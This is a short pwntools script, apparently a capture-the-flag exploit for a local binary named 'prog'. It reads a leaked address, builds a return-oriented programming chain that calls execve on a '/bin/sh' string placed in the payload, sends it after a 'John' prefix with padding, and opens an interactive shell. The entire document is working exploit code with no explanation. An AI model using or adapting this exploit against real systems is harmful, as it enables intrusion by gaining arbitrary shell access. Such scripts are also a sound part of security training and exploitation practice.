from pwn import *

context.binary = 'prog'
e = context.binary

p = e.process()

p.readuntil(b'at')
addr = int(p.readline(), 0)
off = 0

for i in range(2):
	r = ROP(e)
	r.execve(addr+off, 0, 0)
	off = len(r.chain()) + 9

payload = b'John' + b'\0'*5
payload += r.chain()
payload += b'/bin/sh\0'

p.sendline(payload)
p.interactive()
